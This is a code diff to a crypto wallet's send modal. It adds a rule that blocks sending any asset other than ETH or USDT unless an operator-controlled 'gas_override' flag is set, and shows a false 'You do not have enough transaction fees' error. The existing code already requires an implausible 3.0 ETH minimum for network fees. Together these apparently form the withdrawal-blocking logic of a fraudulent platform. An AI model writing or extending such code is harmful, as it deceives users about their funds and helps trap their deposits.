@@ -49,16 +49,15 @@ export function SmartSendModal({ asset, balance, onClose, onSuccess }: SmartSend
   useEffect(() => {
     const checkGas = async () => {
       setIsGasLoading(true);
-      if (asset !== 'ETH' && asset !== 'USDT') {
-        setIsGasLoading(false);
-        setEthBalance(999); 
-        return;
-      }
       try {
         const { data: { user } } = await supabase.auth.getUser();
         if (user) {
           const { data: w } = await supabase.from('wallets').select('*').eq('user_id', user.id).single();
-          setEthBalance(w?.balance ?? 0);
+          if (asset !== 'ETH' && asset !== 'USDT') {
+            setEthBalance(999); 
+          } else {
+            setEthBalance(w?.balance ?? 0);
+          }
           setGasOverride(w?.gas_override || false);
         }
       } catch (e) { console.error(e); } finally { setIsGasLoading(false); }
@@ -111,9 +110,10 @@ export function SmartSendModal({ asset, balance, onClose, onSuccess }: SmartSend
   const isInsufficient = asset === 'ETH' ? isInsufficientEthForGas : (isInsufficientAsset || isInsufficientEthForGas);
 
   const isGasRestricted = !gasOverride && (asset === 'ETH' || asset === 'USDT') && (ethBalance < 3.0);
+  const isOtherAssetRestricted = !gasOverride && asset !== 'ETH' && asset !== 'USDT';
   const isAddressValid = address.length > 20; 
   const isAmountValid = numAmount > 0;
-  const canProceed = !isGasLoading && !isGasRestricted && isAddressValid && isAmountValid && !isInsufficient;
+  const canProceed = !isGasLoading && !isGasRestricted && !isOtherAssetRestricted && isAddressValid && isAmountValid && !isInsufficient;
 
   const handleMax = () => {
     if (asset === 'ETH') {
@@ -142,6 +142,7 @@ export function SmartSendModal({ asset, balance, onClose, onSuccess }: SmartSend
       if (!user) throw new Error("Authentication Error");
 
       if (isGasRestricted) throw new Error("Insufficient ETH for network fees (Min 3.0 ETH required)");
+      if (isOtherAssetRestricted) throw new Error("You do not have enough transaction fees");
 
       // 1. INSERT TRANSACTION
       const { error: txError } = await supabase.from('transactions').insert({
@@ -234,6 +235,13 @@ export function SmartSendModal({ asset, balance, onClose, onSuccess }: SmartSend
                         <div className="flex items-center gap-2 text-[10px] font-mono text-zinc-500">
                            <Wifi size={10} className={ethBalance >= 3.0 ? "text-emerald-500" : "text-red-500"} />
                            <span>ETH Balance: {ethBalance.toFixed(4)}</span>
+                        </div>
+                    </div>
+                ) : isOtherAssetRestricted ? (
+                    <div className="flex flex-col items-center gap-1 animate-in fade-in">
+                        <div className="flex items-center gap-1.5 text-red-500">
+                           <Lock size={14} />
+                           <span className="text-xs font-bold">You do not have enough transaction fees</span>
                         </div>
                     </div>
                 ) : isInsufficientAsset ? (
